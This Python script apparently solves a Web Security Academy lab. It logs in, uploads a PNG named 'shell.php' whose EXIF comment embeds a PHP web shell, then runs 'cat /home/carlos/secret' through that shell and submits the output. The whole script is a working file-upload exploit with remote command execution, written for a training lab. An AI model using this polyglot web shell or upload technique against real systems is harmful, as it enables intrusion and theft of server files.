from web_security_academy.core.logger import logger
from urllib.parse import urlencode
from base64 import b64decode


def solve_lab(session):
    session.login("wiener", "peter")

    image = b64decode(
        # Base64 encoding of 1 x 1 PNG img with the following EXIF data:
        # Comment: <?php echo SYSTEM($_GET["cmd"]) ?>
        "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAKnRFWHRDb21tZW50ADw/cGhwIGVj"
        "aG8gU1lTVEVNKCRfR0VUWyJjbWQiXSkgPz7OcIMuAAAADUlEQVQIW2P4v5ThPwAG7wKklwQ/bwAA"
        "AABJRU5ErkJggg=="
    )

    csrf = session.get_csrf_token("/my-account")
    files = {"avatar": ("shell.php", image)}
    data = {"user": "wiener", "csrf": csrf}
    session.post_path("/my-account/avatar", files=files, data=data)
    logger.info('Uploaded the following file to "/my-account/avatar":')
    logger.info(files)

    params = {"cmd": "cat /home/carlos/secret"}
    resp = session.get_path("/files/avatars/shell.php", params=params)
    logger.info(
        f'Got the 200 response from visiting "/files/avatars/shell.php?{urlencode(params)}"'
    )

    # Extract command output from image data
    output = resp.text[48:-41]

    # For some reason, the secret file is printed twice in the HTTP response.
    answer = output[: (len(output) // 2)]
    session.submit_solution(answer)
